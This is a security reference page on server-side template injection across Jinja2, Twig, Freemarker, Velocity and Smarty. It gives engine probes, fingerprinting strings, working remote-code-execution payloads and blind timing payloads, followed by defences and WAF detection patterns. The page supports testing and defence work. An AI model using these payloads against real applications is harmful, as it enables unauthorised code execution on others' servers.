---
title: Server-side template injection
slug: ssti
---

{% raw %}

> **TL;DR:** User input is rendered as a template expression by Jinja2 / Twig / Velocity / Freemarker / ERB, escaping the data context into the engine's expression language and on to RCE.

## What it is
Template engines split content into static text and expressions evaluated against a context object. When developer code does `Template(user_input).render(...)` instead of `Template(static).render(user=user_input)`, the input becomes code. Most engines expose enough reflection or built-in functions to reach the host process — file I/O, subprocess, or arbitrary class instantiation.

## Preconditions / where it applies
- Server-rendered HTML, emails, PDFs, or document exports where a user-controlled value flows into the template source.
- Engines: Jinja2 / Twig / Smarty / Mako (PHP/Python), Velocity / Freemarker / Thymeleaf (Java), ERB / Liquid / Slim (Ruby), Razor (.NET), Handlebars / pug (Node — usually sandboxed).
- Often via "personalisation" features: greeting templates, mail-merge, signature templates, report generators, low-code form designers.

## Technique
1. **Probe.** Inject syntax for several engines and look for evaluation.

   ```text
   {{7*7}}              -> 49 (Jinja2, Twig, Liquid, Mustache-extended)
   ${7*7}               -> 49 (Freemarker, Velocity, Thymeleaf, Spring EL)
   <%= 7*7 %>           -> 49 (ERB, Razor)
   #set($x=7*7)$x       -> 49 (Velocity)
   ```

2. **Fingerprint.** Differentiate engines via syntax that's unique — `{{7*'7'}}` returns `7777777` in Jinja2 but errors in Twig 2; `{{config.items()}}` is Jinja2; `{{_self.env}}` is Twig.
3. **Jinja2 RCE.** Walk the MRO to reach `os.popen`:

   ```text
   {{ ''.__class__.__mro__[1].__subclasses__() }}
   {{ ''.__class__.__mro__[1].__subclasses__()[<idx>]
        ('id', shell=True, stdout=-1).communicate() }}
   ```

   Or modern: `{{ cycler.__init__.__globals__.os.popen('id').read() }}`.
4. **Twig RCE.** `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}`.
5. **Freemarker RCE.** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.
6. **Velocity RCE.** `#set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))`.
7. **Smarty.** `{system("id")}` once `security_policy` is disabled.
8. **Sandbox escapes.** Even where a sandbox is on, engine bugs and access to `__globals__` / `Runtime` often punch through; check the engine's CVE history.
9. **Blind SSTI.** No output rendering — use timing (`{{ ''.__class__.__mro__[1].__subclasses__()[<n>]('sleep 5', shell=True) }}`) or DNS callbacks.

## Detection and defence
- Never compile a template from user input. Render with a fixed template and pass values via the context dictionary.
- If a "user templates" feature is truly required, run it in a hardened sandbox engine designed for it (Liquid, Handlebars with `noEscape:false`, MiniJinja with extension disable), or in an isolated process with no FS / network access.
- Patch engines aggressively; Twig, Freemarker, and Jinja2 have a long history of sandbox bypasses.
- Detection: WAF rules for `{{`, `${`, `<%=` in fields that should never contain them; logs of exception traces from the template engine on the request path.

## References
- [PortSwigger — Server-side template injection](https://portswigger.net/web-security/server-side-template-injection) — labs and engine matrix.
- [PortSwigger — Server-Side Template Injection (Kettle, 2015)](https://portswigger.net/research/server-side-template-injection) — original paper.
- [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) — payload reference per engine.
{% endraw %}
